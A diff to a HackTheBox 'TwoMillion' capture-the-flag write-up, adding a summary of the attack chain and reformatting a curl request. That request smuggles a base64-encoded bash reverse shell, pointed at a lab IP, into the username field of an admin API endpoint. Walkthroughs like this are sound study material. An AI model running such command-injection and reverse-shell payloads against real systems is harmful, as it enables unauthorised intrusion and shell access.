@@ -1,4 +1,5 @@
-*Add details and images, then add to resume*
+
+TwoMillion is a retired linux box that HackTheBox, celebrated reaching 2 million users. The vulnerability features an invite code which can be received by enumerating various API endpoints via the `curl` command, which can be used to elevate the user to administrator. As an administrator the attacker can perform a command injection gaining a system shell. Via the shell the `.env` file has database credentials and can reuse these credentials via `ssh` to login as admin. The system kernel is outdated and CVE-2023-0386 can be used to get root shell.   
 
 Running `nmap`, there are two ports open, 22, and 80 running ssh and http respectively. 
 
@@ -162,8 +163,7 @@ But the payload must be encrypted via base64:
 ```
 curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
 "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
-'{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= |
-base64 -d | bash;"}'
+'{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= | base64 -d | bash;"}'
 ```
 
 This is a success and I get shell access on the web-server.
